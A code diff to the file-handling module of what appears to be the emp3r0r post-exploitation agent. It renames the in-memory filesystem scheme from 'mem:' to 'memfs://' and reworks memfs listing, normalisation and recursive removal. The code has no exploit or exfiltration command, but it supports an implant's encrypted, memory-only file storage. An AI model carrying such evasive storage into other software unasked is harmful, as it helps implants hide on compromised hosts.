@@ -20,6 +20,22 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/sysinfo"
 )
 
+// memfsPrefix is the only scheme for the in-memory filesystem. All memfs keys
+// are stored in strict memfs:/// form (flat namespace: a key is a name, not a
+// real directory hierarchy).
+const memfsPrefix = "memfs://"
+
+// isMemPath reports whether path targets the in-memory filesystem.
+func isMemPath(path string) bool {
+	return strings.HasPrefix(path, memfsPrefix)
+}
+
+// IsMemPath is the exported form of isMemPath for callers outside this
+// package that need to branch on memfs vs disk targets.
+func IsMemPath(path string) bool {
+	return isMemPath(path)
+}
+
 // Dentry Directory entry
 type Dentry struct {
 	Name       string `json:"name" cbor:"1,keyasint"`  // filename
@@ -40,7 +56,7 @@ type FileStat struct {
 
 // LsPath ls path and return cbor data
 func LsPath(path string) ([]byte, error) {
-	if strings.HasPrefix(path, "mem:") {
+	if isMemPath(path) {
 		dents := lsMemDir(path)
 		return cbor.Marshal(dents)
 	}
@@ -58,7 +74,7 @@ func LsPath(path string) ([]byte, error) {
 	}
 
 	// if it's a file, return its info
-	if IsFileExist(path) && !strings.HasPrefix(path, "mem:") {
+	if IsFileExist(path) && !isMemPath(path) {
 		info, statErr := os.Stat(path)
 		if statErr == nil && !info.IsDir() {
 			dents := []Dentry{parse_fileInfo(info)}
@@ -88,20 +104,17 @@ func LsPath(path string) ([]byte, error) {
 
 // lsMemDir lists all entries in the in-memory filesystem (MemFileMap).
 // memfs is a flat key-value store — paths are just names, not real directories.
-// When targetPath is the root ("mem:///"), all keys are listed.
+// When targetPath is the root ("memfs:///"), all keys are listed.
 // When targetPath is a prefix, only keys under that prefix are listed.
 func lsMemDir(targetPath string) []Dentry {
 	var dents []Dentry
 
-	// Normalize root forms
-	isRoot := targetPath == "" ||
-		targetPath == "mem:" ||
-		targetPath == "mem:/" ||
-		targetPath == "mem://" ||
-		targetPath == "mem:///"
+	// Normalize the requested path; root is memfs:///.
+	targetPath = NormalizeMemPath(targetPath)
+	isRoot := targetPath == memfsPrefix+"/"
 
 	// For sub-path queries, ensure prefix ends with "/"
-	prefix := NormalizeMemPath(targetPath)
+	prefix := targetPath
 	if !strings.HasSuffix(prefix, "/") {
 		prefix += "/"
 	}
@@ -110,7 +123,7 @@ func lsMemDir(targetPath string) []Dentry {
 	defer MemFileLock.RUnlock()
 
 	for memPath := range MemFileMap {
-		if !strings.HasPrefix(memPath, "mem:") {
+		if !isMemPath(memPath) {
 			continue
 		}
 		// Root listing: include every key
@@ -119,7 +132,7 @@ func lsMemDir(targetPath string) []Dentry {
 			continue
 		}
 		dents = append(dents, Dentry{
-			Name:       memPath, // show full mem:/// path so users know exactly where it lives
+			Name:       memPath, // show full memfs:/// path so users know exactly where it lives
 			Ftype:      "file (mem)",
 			Size:       fmt.Sprintf("%d bytes", memBytesFor(memPath)),
 			Date:       "N/A",
@@ -136,20 +149,22 @@ func IsCommandExist(exe string) bool {
 	return err == nil
 }
 
-// NormalizeMemPath canonicalizes any mem: URI into strict mem:/// format.
-// e.g. "mem:foo" -> "mem:///foo", "mem:/foo" -> "mem:///foo", "mem://foo" -> "mem:///foo", "mem:///foo" -> "mem:///foo"
+// NormalizeMemPath canonicalizes a memfs path into strict memfs:/// form,
+// e.g. "memfs:///foo" -> "memfs:///foo", "memfs:/foo" -> "memfs:///foo",
+// "memfs://foo" -> "memfs:///foo". Paths without the memfs scheme are
+// returned unchanged (assumed disk paths).
 func NormalizeMemPath(path string) string {
-	if !strings.HasPrefix(path, "mem:") {
+	if !isMemPath(path) {
 		return path
 	}
-	clean := strings.TrimPrefix(path, "mem:")
-	clean = strings.TrimLeft(clean, "/")
-	return "mem:///" + clean
+	rest := strings.TrimPrefix(path, memfsPrefix)
+	rest = strings.TrimLeft(rest, "/")
+	return memfsPrefix + "/" + rest
 }
 
 // IsFileExist check if a file exists
 func IsFileExist(path string) bool {
-	if strings.HasPrefix(path, "mem:") {
+	if isMemPath(path) {
 		norm := NormalizeMemPath(path)
 		MemFileLock.RLock()
 		_, ok := MemFileMap[norm]
@@ -170,9 +185,9 @@ func IsFileExist(path string) bool {
 
 // IsExist check if a path exists
 func IsExist(path string) bool {
-	if strings.HasPrefix(path, "mem:") {
+	if isMemPath(path) {
 		norm := NormalizeMemPath(path)
-		if norm == "mem:///" {
+		if norm == memfsPrefix+"/" {
 			return true
 		}
 		MemFileLock.RLock()
@@ -187,9 +202,9 @@ func IsExist(path string) bool {
 
 // IsDirExist check if a directory exists
 func IsDirExist(path string) bool {
-	if strings.HasPrefix(path, "mem:") {
+	if isMemPath(path) {
 		norm := NormalizeMemPath(path)
-		if norm == "mem:///" {
+		if norm == memfsPrefix+"/" {
 			return true
 		}
 		prefix := norm
@@ -390,7 +405,7 @@ func SecureLocalPath(path string) (string, error) {
 
 // FileBaseName extracts the base name of the file from a given path while enforcing locality.
 func FileBaseName(path string) string {
-	if strings.HasPrefix(path, "mem:") {
+	if isMemPath(path) {
 		norm := NormalizeMemPath(path)
 		return filepath.Base(norm)
 	}
@@ -422,7 +437,7 @@ func FileAllocate(filepath string, n int64) (err error) {
 
 // FileSize calc file size
 func FileSize(path string) (size int64) {
-	if strings.HasPrefix(path, "mem:") {
+	if isMemPath(path) {
 		norm := NormalizeMemPath(path)
 		MemFileLock.RLock()
 		_, ok := MemFileMap[norm]
@@ -555,37 +570,65 @@ func ApplyFilePattern(path string) string {
 
 // Agent-specific file operations for centralized control
 
-// MkdirAgent creates a directory (in memory for mem: paths, or on disk)
+// MkdirAgent creates a directory. memfs has no real directories (it is a flat
+// key space under memfs:///; path-like names are only visual grouping), so
+// mkdir on a memfs path is rejected instead of silently succeeding.
 func MkdirAgent(path string, perm os.FileMode) error {
-	if strings.HasPrefix(path, "mem:") {
-		return nil
+	if isMemPath(path) {
+		return fmt.Errorf("mkdir %s: memfs has no directories (only files under memfs:///)", path)
 	}
 	return os.MkdirAll(path, perm)
 }
 
-// RemoveFileAgent removes a file (wrapper for os.RemoveAll with pattern support)
+// RemoveFileAgent removes a file or directory. For memfs it removes the key
+// (and any spilled backing file). Removing a path that looks like a container
+// (e.g. memfs:///sub or memfs:///sub/) removes every key under that prefix,
+// which is how recursive delete works in the flat namespace.
 func RemoveFileAgent(path string) error {
 	path = ApplyFilePattern(path)
 
-	if strings.HasPrefix(path, "mem:") {
-		path = NormalizeMemPath(path)
-		MemFileLock.Lock()
-		if old := MemFileMap[path]; old != nil {
-			memTotalBytes -= int64(len(old))
+	if isMemPath(path) {
+		norm := NormalizeMemPath(path)
+		if norm == memfsPrefix+"/" {
+			return fmt.Errorf("rm %s: refusing to remove the memfs root", path)
 		}
-		delete(MemFileMap, path)
-		if p := memSpillPaths[path]; p != "" {
-			delete(memSpilled, path)
-			delete(memSpillPaths, path)
+		// Remove the key itself plus, when it names a container prefix, every
+		// key stored under that prefix.
+		prefix := norm
+		if !strings.HasSuffix(prefix, "/") {
+			prefix += "/"
+		}
+		var toRemove []string
+		MemFileLock.Lock()
+		for k := range MemFileMap {
+			if k == norm || strings.HasPrefix(k, prefix) {
+				toRemove = append(toRemove, k)
+			}
+		}
+		if len(toRemove) == 0 {
 			MemFileLock.Unlock()
-			_ = os.Remove(p)
-			NotifyMemFSChanged()
-			logging.Debugf("Agent: Removed memory file %s", path)
-			return nil
+			return fmt.Errorf("rm %s: no such memfs file", path)
+		}
+		// Drop namespace entries and spill metadata under the lock; delete the
+		// backing files after unlock (no disk I/O while holding the lock).
+		var stalePaths []string
+		for _, k := range toRemove {
+			if old := MemFileMap[k]; old != nil {
+				memTotalBytes -= int64(len(old))
+			}
+			delete(MemFileMap, k)
+			delete(memSpilled, k)
+			if p := memSpillPaths[k]; p != "" {
+				stalePaths = append(stalePaths, p)
+			}
+			delete(memSpillPaths, k)
 		}
 		MemFileLock.Unlock()
+		for _, p := range stalePaths {
+			_ = os.Remove(p)
+		}
 		NotifyMemFSChanged()
-		logging.Debugf("Agent: Removed memory file %s", path)
+		logging.Debugf("Agent: Removed %d memfs entrie(s) under %s", len(toRemove), norm)
 		return nil
 	}
 
@@ -602,7 +645,7 @@ func CopyAgent(src, dst string) error {
 		return fmt.Errorf("CopyAgent: %s does not exist", src)
 	}
 
-	if strings.HasPrefix(src, "mem:") {
+	if isMemPath(src) {
 		return copyFileAgent(src, dst)
 	}
 
@@ -623,7 +666,7 @@ func copyFileAgent(src, dst string) error {
 		return err
 	}
 
-	if !strings.HasPrefix(dst, "mem:") {
+	if !isMemPath(dst) {
 		f, err := os.Stat(dst)
 		if err == nil && f.IsDir() {
 			dst = filepath.Join(dst, FileBaseName(src))
@@ -919,7 +962,7 @@ func ListMemFiles() []string {
 	defer MemFileLock.RUnlock()
 	keys := make([]string, 0, len(MemFileMap))
 	for k := range MemFileMap {
-		if strings.HasPrefix(k, "mem:") {
+		if isMemPath(k) {
 			keys = append(keys, k)
 		}
 	}
@@ -954,7 +997,7 @@ func WriteFileAgent(filename string, data []byte, perm os.FileMode) error {
 func SaveFileAgent(filename string, data []byte, perm os.FileMode, strategy StorageStrategy) error {
 	filename = ApplyFilePattern(filename)
 
-	if strings.HasPrefix(filename, "mem:") || strategy == StorageMemory {
+	if isMemPath(filename) || strategy == StorageMemory {
 		filename = NormalizeMemPath(filename)
 
 		if len(fileCryptoKey) > 0 {
@@ -1032,7 +1075,7 @@ func ReadFileAgent(filename string) ([]byte, error) {
 	var data []byte
 	var err error
 
-	if strings.HasPrefix(filename, "mem:") {
+	if isMemPath(filename) {
 		filename = NormalizeMemPath(filename)
 		MemFileLock.RLock()
 		_, isSpilled := memSpilled[filename]
@@ -1137,10 +1180,10 @@ func AppendToFileAgent(filename string, data []byte) error {
 		// Read, decrypt, append, encrypt, write
 		existing, err := ReadFileAgent(filename)
 		if err != nil && !os.IsNotExist(err) {
-			// A fresh memfs:// file reports a plain not-found error rather than
+			// A fresh memfs file reports a plain not-found error rather than
 			// os.ErrNotExist; treat it as empty so the first encrypted append
 			// works there too.
-			if !strings.HasPrefix(filename, "mem:") || !strings.Contains(err.Error(), "not found") {
+			if !isMemPath(filename) || !strings.Contains(err.Error(), "not found") {
 				return fmt.Errorf("AppendToFileAgent read: %v", err)
 			}
 			existing = nil
